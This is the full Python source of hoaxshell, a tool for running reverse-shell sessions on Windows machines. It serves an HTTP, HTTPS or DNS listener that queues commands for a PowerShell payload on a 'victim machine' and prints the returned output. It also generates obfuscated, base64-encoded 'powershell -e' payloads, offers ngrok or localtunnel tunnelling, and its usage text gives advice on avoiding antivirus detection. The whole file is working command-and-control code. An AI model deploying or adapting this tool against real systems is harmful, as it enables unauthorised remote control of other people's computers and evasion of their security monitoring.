#!/bin/python3
#
# Author: Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, argparse, base64, readline, uuid, re
from os import system, path
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event
from time import sleep
from ipaddress import ip_address
from subprocess import check_output, Popen, PIPE
from string import ascii_uppercase, ascii_lowercase
from platform import system as get_system_type
from random import randint
import socketserver
import struct
from textwrap import wrap
from dnslib import *

filterwarnings("ignore", category = DeprecationWarning)

''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'

# Enable ansi escape characters
def chill():
	pass

WINDOWS = True if get_system_type() == 'Windows' else False
system('') if WINDOWS else chill()


# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser(
	formatter_class=argparse.RawTextHelpFormatter,
	epilog='''
	
Usage examples:

  - Basic shell session over http:

      sudo python3 hoaxshell.py -s <your_ip>
      
  - Recommended usage to avoid detection (over http):
	  
     # Hoaxshell utilizes an http header to transfer shell session info. By default, the header is given a random name which can be detected by regex-based AV rules. 
     # Use -H to provide a standard or custom http header name to avoid detection.
     sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization"
     
     # The same but with --exec-outfile (-x)
     sudo python3 hoaxshell.py -s <your_ip> -i -H "Authorization" -x "C:\\Users\\\\\\$env:USERNAME\.local\hack.ps1"

  - Encrypted shell session (https):
	  
     # First you need to generate self-signed certificates:
     openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
     sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
  
  - Encrypted shell session with a trusted certificate:
  
     sudo python3 hoaxshell.py -s <your.domain.com> -t -c </path/to/cert.pem> -k <path/to/key.pem>

  - Encrypted shell session with reverse proxy tunneling tools:
  
     sudo python3 hoaxshell.py -lt 

	 OR 

     sudo python3 hoaxshell.py -ng

  - Use a self hosted DNS server to send the payload using domain TXT records:

     # Make sure you're allowed to use port 53 and forwarding is enabled to use this feature.

	 # For UDP based DNS servers:
	 sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -udp 
	
	 # For TCP based DNS servers:
	 sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -tcp
	
	 # For both UDP and TCP based DNS servers:
	 sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -tcp -udp

'''
)

parser.add_argument("-s", "--server-ip", action="store", help = "Your hoaxshell server ip address or domain.")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate.")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate.")
parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell server port (default: 8080 over http, 443 over https).", type = int)
parser.add_argument("-f", "--frequency", action="store", help = "Frequency of cmd execution queue cycle (A low value creates a faster shell but produces more http traffic. *Less than 0.8 will cause trouble. default: 0.8s).", type = float)
parser.add_argument("-i", "--invoke-restmethod", action="store_true", help = "Generate payload using the 'Invoke-RestMethod' instead of the default 'Invoke-WebRequest' utility.")
parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. A random name is given to that header by default. Use this option to set a custom header name.")
parser.add_argument("-x", "--exec-outfile", action="store", help = "Provide a filename (absolute path) on the victim machine to write and execute commands from instead of using \"Invoke-Expression\". The path better be quoted. Be careful when using special chars in the path (e.g. $env:USERNAME) as they must be properly escaped. See usage examples for details. CAUTION: you won't be able to change directory with this method. Your commands must include ablsolute paths to files etc.")
parser.add_argument("-r", "--raw-payload", action="store_true", help = "Generate raw payload instead of base64 encoded.")
parser.add_argument("-o", "--obfuscate", action="store_true", help = "Obfuscate generated payload.")
parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to restore a live session (default: false).")
parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
parser.add_argument("-cm", "--constraint-mode", action="store_true", help="Generate a payload that works even if the victim is configured to run PS in Constraint Language mode. By using this option, you sacrifice a bit of your reverse shell's stdout decoding accuracy.")
parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate Payload with localtunnel")
parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
parser.add_argument("-dns", "--dns-server", action="store_true", help="Transmit payload over DNS server.")
parser.add_argument("-d", "--domain", action="store", help="Fake domain name for DNS server - only used with -dns")
parser.add_argument("-tcp","--tcp", action="store_true", help="Start dns server in tcp mode - only used with -dns")
parser.add_argument("-udp","--udp", action="store_true", help="Start dns server in udp mode - only used with -dns")
parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")

args = parser.parse_args()


def exit_with_msg(msg):
	print(f"[{DEBUG}] {msg}")
	sys.exit(0)


# Check if port is valid.
if args.port:
	if args.port < 1 or args.port > 65535:
		exit_with_msg('Port number is not valid.')

# Check if both cert and key files were provided
if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
	exit_with_msg('Failed to start over https. Missing key or cert file (check -h for more details).')

ssl_support = True if args.certfile and args.keyfile else False

# -------------- General Functions -------------- #
def print_banner():

	padding = '  '

	H = [[' ', '┐', ' ', '┌'], [' ', '├','╫','┤'], [' ', '┘',' ','└']]
	O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
	X = [[' ', '─','┐',' ','┬'], [' ', '┌','┴','┬', '┘'], [' ', '┴',' ','└','─']]
	S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]
	H = [[' ', '┬',' ','┬'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
	E = [[' ', '┌','─','┐'], [' ', '├','┤',' '], [' ', '└','─','┘']]
	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]

	banner = [H,O,A,X,S,H,E,L,L]
	final = []
	print('\r')
	init_color = 36
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{END}{padding}                         by t3l3machus\n')



def promptHelpMsg():
	print(
	'''
	\r  Command                    Description
	\r  -------                    -----------
	\r  help                       Print this message.
	\r  payload                    Print payload (base64).
	\r  rawpayload                 Print payload (raw).
	\r  clear                      Clear screen.
	\r  exit/quit/q                Close session and exit.
	''')



def encodePayload(payload):
	'''Encoded Paylaod'''
	enc_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
	return enc_payload


def generateDNSPayload(enc_payload):
	'''Encoded Paylaod'''
	DNSserver.prepare(enc_payload)
	range = DNSserver.get_range()  # Payload chunk counts for subdomain generation
	#starting DNS server
	try:
		DNSserver.start()
	except OSError as error:
		if error.errno == 98:
			exit(f'\n[{FAILED}] - {BOLD}Port 53 seems to already be in use.{END}\n')  
		elif error.errno == 13:
			exit(f'\n[{FAILED}] - {BOLD}Permission denied. Try running as root (with sudo).{END}\n')
		else:
			exit(f'\n[{FAILED}] - {BOLD}{error}{END}\n')

	#Payload if both TCP and UDP servers are running
	if not (args.tcp and args.udp):
		DnsPayload = open(f'{cwd}/payload_templates/payload_dns_udp.ps1', 'r') if not args.tcp else open(
							f'{cwd}/payload_templates/payload_dns_tcp.ps1', 'r')

		payload = DnsPayload.read().strip()
		DnsPayload.close()
	else:
		TcpPayload = open(f'{cwd}/payload_templates/payload_dns_tcp.ps1', 'r').read().strip()
		UdpPayload = open(f'{cwd}/payload_templates/payload_dns_udp.ps1', 'r').read().strip()

		payload = f'{END}[{INFO}] Payload for {MAIN}TCP{END} baesd DNS Lookup\n{PLOAD}{TcpPayload}{END}\n{END}[{INFO}] Payload for {MAIN}UDP{END} baesd DNS Lookup\n{PLOAD}{UdpPayload}{END}'

	payload = payload.replace('*SERVERIP*', args.server_ip).replace(
		'*DOMAIN*', args.domain).replace('*RANGE*', str(range))
	
	return payload

def is_valid_uuid(value):

    try:
        uuid.UUID(str(value))
        return True

    except ValueError:
        return False



def checkPulse(stop_event):

	while not stop_event.is_set():

		timestamp = int(datetime.now().timestamp())
		tlimit = frequency + 10

		if Hoaxshell.execution_verified and Hoaxshell.prompt_ready:
			if abs(Hoaxshell.last_received - timestamp) > tlimit:
				print(f'\r[{WARN}] Session has been idle for more than {tlimit} seconds. Shell probably died.')
				Hoaxshell.prompt_ready = True
				stop_event.set()

		else:
			Hoaxshell.last_received = timestamp
			
		sleep(5)


# ------------------ Settings ------------------ #
prompt = "hoaxshell > "
quiet = True if args.quiet else False
frequency = args.frequency if args.frequency else 0.8
stop_event = Event()
t_process = None


def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):

	if Hoaxshell.rst_promt_required or force_rst:
		sys.stdout.write(prefix + prompt + readline.get_line_buffer())
		Hoaxshell.rst_promt_required = False


# -------------- Tunneling Server -------------- #
class Tunneling:

	def __init__(self, port):

		'''Initialization of Tunnel Process'''

		localtunnel = ['lt', '-p', str(port), '-l', '127.0.0.1']
		ngrok = ['ngrok', 'http', str(port), '--log', 'stdout']

		if args.ngrok:
			self.__start(ngrok)
		elif args.localtunnel:
			self.__start(localtunnel)
	
	def __start(self, command):
		'''Start Tunneling Process'''
		try:
			self.process = Popen(
				command,
				stdin=PIPE,
				stdout=PIPE,
				stderr=PIPE)
		except FileNotFoundError:

			if args.localtunnel:

				exit_with_msg(f"Please install LocalTunnel using the instructions at https://localtunnel.me")

			elif args.ngrok:

				exit_with_msg(f"Please install Ngrok using the instructions at https://ngrok.com")

	def lt_address(self):
		'''LocalTunnel Address'''

		output = self.process.stdout.readline().decode("utf-8").strip()

		try:
		
			if output and "your url is" in output:
				return output.replace('your url is: https://', '')

			else:
				self.process.kill()
				exit_with_msg(f"{output}")
		except Exception as ex:
			exit_with_msg(ex)
	
	def ngrok_address(self):
		'''Ngrok Address'''

		try:
			#sleep(5) #wait until ngrok get start
			while True:
				output = self.process.stdout.readline().decode("utf-8").strip()

				if not output and self.process.poll() is not None:
					break

				elif 'url=' in output:
					#output = output.split('url=https://')[-1]
					output = url = re.compile(r".*url=(http|https):\/\/(.*)").findall(output)[0][1]
					return output

		except Exception as ex:
			self.process.terminate()
			exit_with_msg(ex)
		

	def terminate(self):

		self.process.kill() #Terminate running tunnel process
		print(f'\r[{WARN}] Tunnel terminated.')

#--------------- DNS Server ------------------- #

class DNSServer:
	'''DNS Server'''
	def __init__(self, domain):
		self.domain = domain
		self.IP = '127.0.0.1'
		self.TTL = 60 * 5
		self.records = {}
		self.ns_records = None
		self.soa_record = None
		self.range = None
	
	def prepare(self, payload):
		'''Prepare DNS Server Records'''
		TXT_PAYLAOD = wrap(payload, 255)  # TXT records have limit of 255 characters
		self.range = len(TXT_PAYLAOD)
		for i, txt_record in enumerate(TXT_PAYLAOD):

			SubDomain = DomainName('{}.{}'.format(i+1, self.domain))
			self.soa_record = SOA(
				mname=SubDomain.ns1,  # primary name server
				rname=SubDomain.magnito,  # email of the domain administrator
				times=(
					201307231,  # serial number
					60 * 60 * 1,  # refresh
					60 * 60 * 3,  # retry
					60 * 60 * 24, # expire
					60 * 60 * 1,  # minimum
				)
			)
			self.ns_records = [NS(SubDomain.ns1), NS(SubDomain.ns2)]
			self.records.update({
				SubDomain: [A(self.IP), AAAA((0,) * 16), MX(SubDomain.mail), TXT(txt_record), self.soa_record] + self.ns_records,
				# MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
				SubDomain.ns1: [A(self.IP)],
				SubDomain.ns2: [A(self.IP)],
				SubDomain.mail: [A(self.IP)],
				SubDomain.andrei: [CNAME(SubDomain)],
			})

	def get_range(self):
		'''Subdomain Ranges'''
		return self.range

	def start(self):
		'''Start DNS Server'''
		servers = []

		if args.udp:
			servers.append(socketserver.ThreadingUDPServer(
				('', 53), UDPRequestHandler))
		if args.tcp:
			servers.append(socketserver.ThreadingTCPServer(
				('', 53), TCPRequestHandler))

		for s in servers:
			# that thread will start one more thread for each request
			thread = Thread(target=s.serve_forever)
			thread.daemon = True  # exit the server thread when the main thread terminates
			thread.start()
			print(f"[{INFO}] DNS {ORANGE}{s.RequestHandlerClass.__name__[:3]}{END} server loop running in thread: {ORANGE}{thread.name}{END}")


class DomainName(str):
	'''Domain Name'''
	def __getattr__(self, item):
		return DomainName(item + '.' + self)


class BaseRequestHandler(socketserver.BaseRequestHandler):
	'''Base Request Handler'''

	def get_data(self):
		raise NotImplementedError

	def send_data(self, data):
		raise NotImplementedError

	def handle(self):
		try:
			data = self.get_data()
			self.send_data(self.dns_response(data))
		except Exception:
			pass

	def dns_response(self, data):
		request = DNSRecord.parse(data)

		reply = DNSRecord(DNSHeader(id=request.header.id,
									qr=1, aa=1, ra=1), q=request.q)

		qname = request.q.qname
		qn = str(qname)
		qtype = request.q.qtype
		qt = QTYPE[qtype]

		if qn == DNSserver.domain or qn.endswith('.' + DNSserver.domain):

			for name, rrs in DNSserver.records.items():
				if name == qn:
					for rdata in rrs:
						rqt = rdata.__class__.__name__
						if qt in ['*', rqt]:
							reply.add_answer(RR(rname=qname, rtype=getattr(
								QTYPE, rqt), rclass=1, ttl=DNSserver.TTL, rdata=rdata))

			for rdata in DNSserver.ns_records:
				reply.add_ar(RR(rname=qn, rtype=QTYPE.NS,
								rclass=1, ttl=DNSserver.TTL, rdata=rdata))

			reply.add_auth(RR(rname=qn, rtype=QTYPE.SOA,
								rclass=1, ttl=DNSserver.TTL, rdata=DNSserver.soa_record))

		return reply.pack()


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

# -------------- Hoaxshell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):

	restored = False
	rst_promt_required = False
	prompt_ready = True
	command_pool = []
	execution_verified = False
	last_received = ''
	verify = str(uuid.uuid4())[0:8]
	get_cmd = str(uuid.uuid4())[0:8]
	post_res = str(uuid.uuid4())[0:8]
	hid = str(uuid.uuid4()).split("-")
	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
	SESSIONID = '-'.join([verify, get_cmd, post_res])
	server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
	init_dir = None
	
	
	def cmd_output_interpreter(self, output, constraint_mode = False):
	
		global prompt
		
		try:
			
			if constraint_mode:
				output = output.decode('utf-8', 'ignore')
				
			else:
				bin_output = output.decode('utf-8').split(' ')
				to_b_numbers = [ int(n) for n in bin_output ]
				b_array = bytearray(to_b_numbers)
				output = b_array.decode('utf-8', 'ignore')
				
			tmp = output.rsplit("Path", 1)
			output = tmp[0]
			junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
			output = output.rsplit("Drive", 1)[0] if junk else output
			
			if Hoaxshell.init_dir == None:
				p = tmp[-1].strip().rsplit("\n")[-1]
				p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
				Hoaxshell.init_dir = p
										
			if not args.exec_outfile:						
				p = tmp[-1].strip().rsplit("\n")[-1]
				p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
				
			else:
				p = Hoaxshell.init_dir
				
			prompt = f"PS {p} > "

		except UnicodeDecodeError:
			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')

		if isinstance(output, bytes):
			return str(output)

		else:
			output = output.strip() + '\n' if output.strip() != '' else output.strip()
			return output
	


	def do_GET(self):

		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp

		if args.grab and not Hoaxshell.restored:
			if not args.Header:
				header_id = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
				Hoaxshell.header_id = f'X-{header_id[0]}'
			else:
				Hoaxshell.header_id = args.Header
				
			session_id = self.headers.get(Hoaxshell.header_id)
			
			if len(session_id) == 26:
				h = session_id.split('-')
				Hoaxshell.verify = h[0]
				Hoaxshell.get_cmd = h[1]
				Hoaxshell.post_res = h[2]
				Hoaxshell.SESSIONID = session_id
				Hoaxshell.restored = True
				Hoaxshell.execution_verified = True
				session_check = Thread(target = checkPulse, args = (stop_event,))
				session_check.daemon = True
				session_check.start()

				print(f'\r[{GREEN}Shell{END}] {BOLD}Session restored!{END}')
				Hoaxshell.rst_promt_required = True

		self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if session_id == Hoaxshell.SESSIONID else False

		# Verify execution
		if self.path == f'/{Hoaxshell.verify}' and legit:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			self.wfile.write(bytes('OK', "utf-8"))
			Hoaxshell.execution_verified = True
			session_check = Thread(target = checkPulse, args = (stop_event,))
			session_check.daemon = True
			session_check.start()
			print(f'\r[{GREEN}Shell{END}] {BOLD}Payload execution verified!{END}')
			print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end = '\n\n') #end = ''
			print(f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if args.exec_outfile else chill()
			Hoaxshell.prompt_ready = False
			Hoaxshell.command_pool.append(f"echo `r;pwd")
			Hoaxshell.rst_promt_required = True


		# Grab cmd
		elif self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()

			if len(Hoaxshell.command_pool):
				cmd = Hoaxshell.command_pool.pop(0)
				self.wfile.write(bytes(cmd, "utf-8"))

			else:
				self.wfile.write(bytes('None', "utf-8"))

			Hoaxshell.last_received = timestamp


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_POST(self):

		global prompt
		
		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp
		self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if session_id == Hoaxshell.SESSIONID else False

		# cmd output
		if self.path == f'/{Hoaxshell.post_res}' and legit and Hoaxshell.execution_verified:

			try:
				self.send_response(200)
				self.send_header('Access-Control-Allow-Origin', '*')
				self.send_header('Content-Type', 'text/plain')
				self.end_headers()
				self.wfile.write(b'OK')
				content_len = int(self.headers.get('Content-Length'))
				output = self.rfile.read(content_len)
				output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = args.constraint_mode)
				
				if output:				
					print(f'\r{GREEN}{output}{END}')
					
					
			except ConnectionResetError:
				print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')

			rst_prompt(prompt = prompt)
			Hoaxshell.prompt_ready = True

		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_OPTIONS(self):

		self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', Hoaxshell.header_id)
		self.end_headers()
		self.wfile.write(b'OK')


	def log_message(self, format, *args):
		return


	def dropSession():

		print(f'\r[{WARN}] Closing session elegantly...')

		if t_process:
			t_process.terminate()
		
		if not args.exec_outfile:
			Hoaxshell.command_pool.append('exit')
		else:
			Hoaxshell.command_pool.append(f'del {args.exec_outfile};exit')	
			
		sleep(frequency + 2.0)
		print(f'[{WARN}] Session terminated.')
		stop_event.set()
		sys.exit(0)


	def terminate():

			if Hoaxshell.execution_verified:
				Hoaxshell.dropSession()

			else:
				if t_process:
					t_process.terminate()
				print(f'\r[{WARN}] Session terminated.')
				stop_event.set()
				sys.exit(0)



def main():

	global prompt, cwd, DNSserver, t_process
	try:
		chill() if quiet else print_banner()
		cwd = path.dirname(path.abspath(__file__))
		
		# Update utility
		if args.update:

			updated = False

			try:
				
				print(f'[{INFO}] Pulling changes from the master branch...')
				u = check_output(f'cd {cwd}&&git pull https://github.com/t3l3machus/hoaxshell main', shell=True).decode('utf-8')

				if re.search('Updating', u):
					print(f'[{INFO}] Update completed! Please, restart hoaxshell.')
					updated = True

				elif re.search('Already up to date', u):
					print(f'[{INFO}] Already running the latest version!')
					pass

				else:
					print(f'[{FAILED}] Something went wrong. Are you running hoaxshell from your local git repository?')
					print(f'[{DEBUG}] Consider running "git pull https://github.com/t3l3machus/hoaxshell main" inside the project\'s directory.')

			except:
				print(f'[{FAILED}] Update failed. Consider running "git pull https://github.com/t3l3machus/hoaxshell main" inside the project\'s directory.')

			if updated:
				sys.exit(0)

		# Provided options sanity check
		if not args.server_ip and args.update and len(sys.argv) == 2 and not (args.localtunnel or args.ngrok):
			sys.exit(0)

		if not args.server_ip and args.update and len(sys.argv) > 2 and not (args.localtunnel or args.ngrok):
			exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')

		elif not args.server_ip and not args.update and not (args.localtunnel or args.ngrok):
			exit_with_msg('Local host ip or Tunnel not provided (use -s for IP / -lt or -ng for Tunneling)')

		elif any([args.dns_server, args.domain, args.tcp, args.udp]) and (args.localtunnel or args.ngrok):
			exit_with_msg('DNS server\'s paramenters can only be used with Local server (-s) not with localtunnel (-lt) or ngrok (-ng)')

		elif args.dns_server and not any([args.domain, args.tcp, args.udp]):
			exit_with_msg('DNS server must be used with Domain (-d) and protocol(s) -tcp and/or -udp')
		
		elif any([args.domain, args.tcp, args.udp]) and not args.dns_server:
			exit_with_msg('DNS server not provided (use -dns for DNS server)')

		else:
			if not args.trusted_domain and not (args.localtunnel or args.ngrok):
				# Check if provided ip is valid
				try:
					ip_object = ip_address(args.server_ip)

				except ValueError:
					exit_with_msg('IP address is not valid.')

		
		# Check provided header name for illegal chars
		if args.Header:
			valid = ascii_uppercase + ascii_lowercase + '-_'
			
			for char in args.Header:
				if char not in valid:
					 exit_with_msg('Header name includes illegal characters.')
		# DNS server		 
		if args.dns_server and not (args.localtunnel or args.ngrok):
			if not args.domain or not (args.tcp or args.udp):
				exit_with_msg('DNS server requires a domain name (-d, --domain) and a valid protocol (--tcp or --udp).')

			DNSserver = DNSServer((args.domain if args.domain.endswith('.') else args.domain+'.'))


		# Check if http/https
		if ssl_support:
			server_port = int(args.port) if args.port else 443
		else:
			server_port = int(args.port) if args.port else 8080

		# Server IP
		server_ip = f'{args.server_ip}:{server_port}'
		
		# Tunneling
		tunneling = False
		
		if args.localtunnel or args.ngrok:
			tunneling = True
			t_process = Tunneling(server_port) #will start tunnel process accordingly
			
			if args.localtunnel:
				t_server = t_process.lt_address()
				
			elif args.ngrok:
				t_server = t_process.ngrok_address()

			if not t_server:
				exit_with_msg('Failed to initiate tunnel. Possible cause: You have a tunnel agent session already running in the bg/fg.')				
				
		# Start http server
		try:
			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)

		except OSError:
			exit(f'\n[{FAILED}] - {BOLD}Port {server_port} seems to already be in use.{END}\n')

		if ssl_support:
			httpd.socket = ssl.wrap_socket (
				httpd.socket,
				keyfile = args.keyfile ,
				certfile = args.certfile ,
				server_side = True,
				ssl_version=ssl.PROTOCOL_TLS
			)


		port = f':{server_port}' if server_port != 443 else ''

		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()
	
		
		# Generate payload
		if not args.grab:
			print(f'[{INFO}] Generating reverse shell payload...')

			if args.localtunnel:
				source = open(f'{cwd}/payload_templates/https_payload_localtunnel.ps1',
				              'r') if not args.exec_outfile else open('./payload_templates/https_payload_localtunnel_outfile.ps1', 'r')

			elif args.ngrok:
				source = open(f'{cwd}/payload_templates/https_payload_ngrok.ps1',
				              'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/https_payload_ngrok_outfile.ps1', 'r')
				              
			elif not ssl_support:
				source = open(f'{cwd}/payload_templates/http_payload.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/http_payload_outfile.ps1', 'r')
			
			elif ssl_support and args.trusted_domain:
				source = open(f'{cwd}/payload_templates/https_payload_trusted.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/https_payload_trusted_outfile.ps1', 'r')
				
			elif ssl_support and not args.trusted_domain:
				source = open(f'{cwd}/payload_templates/https_payload.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/https_payload_outfile.ps1', 'r')
			
			payload = source.read().strip()
			source.close()
			
			payload = payload.replace('*SERVERIP*', (t_server if (args.localtunnel or args.ngrok) else server_ip)).replace('*SESSIONID*', Hoaxshell.SESSIONID).replace('*FREQ*', str(
				frequency)).replace('*VERIFY*', Hoaxshell.verify).replace('*GETCMD*', Hoaxshell.get_cmd).replace('*POSTRES*', Hoaxshell.post_res).replace('*HOAXID*', Hoaxshell.header_id)
			
			if args.invoke_restmethod:
				payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		

			if args.exec_outfile:
				payload = payload.replace("*OUTFILE*", args.exec_outfile)
			
			if args.constraint_mode:
				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")

			if args.obfuscate:
				
				for var in ['$s', '$i', '$p', '$v']:
					
					_max = randint(1,5)
					obf = str(uuid.uuid4())[0:_max]
					
					payload = payload.replace(var, f'${obf}')
			
			enc_payload = encodePayload(payload)

			if args.raw_payload:
				print(f'{PLOAD}{payload}{END}')

			elif args.dns_server:
				payload = generateDNSPayload(enc_payload)
				print(f'{PLOAD}{payload}{END}')

			else:
				payload = "powershell -e "+enc_payload
				print(f'{PLOAD}{payload}{END}')


			print(f'[{INFO}] Tunneling [{BOLD}{ORANGE}ON{END}]') if tunneling else chill()
			
			if tunneling:
				print(f'[{INFO}] Server Address: {BOLD}{BLUE}{t_server}{END}')

			print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
			print(f'[{INFO}] Https Server started on port {server_port}.') if ssl_support else print(f'[{INFO}] Http Server started on port {server_port}.')
			print(f'[{IMPORTANT}] {BOLD}Awaiting payload execution to initiate shell session...{END}')

		else:
			print(f'\r[{IMPORTANT}] Attempting to restore session. Listening for hoaxshell traffic...')


		# Command prompt
		while True:

			if Hoaxshell.prompt_ready:

				user_input = input(prompt).strip()

				if user_input.lower() == 'help':
					promptHelpMsg()

				elif user_input.lower() in ['clear']:
					system('clear')

				elif user_input.lower() in ['payload']:
					print(f'{PLOAD}{payload}{END}')

				elif user_input.lower() in ['rawpayload']:
					print(f'{PLOAD}{payload}{END}')

				elif user_input.lower() in ['exit', 'quit', 'q']:
					Hoaxshell.terminate()

				elif user_input == '':
					rst_prompt(force_rst = True, prompt = '\r')

				else:

					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
						
						if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"
							
						Hoaxshell.command_pool.append(user_input + f";pwd")
						Hoaxshell.prompt_ready = False

					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
						pass

					else:
						print(f'\r[{INFO}] No active session.')
			# ~ else:
				# ~ sleep(0.5)


	except KeyboardInterrupt:
		Hoaxshell.terminate()


if __name__ == '__main__':
	main()
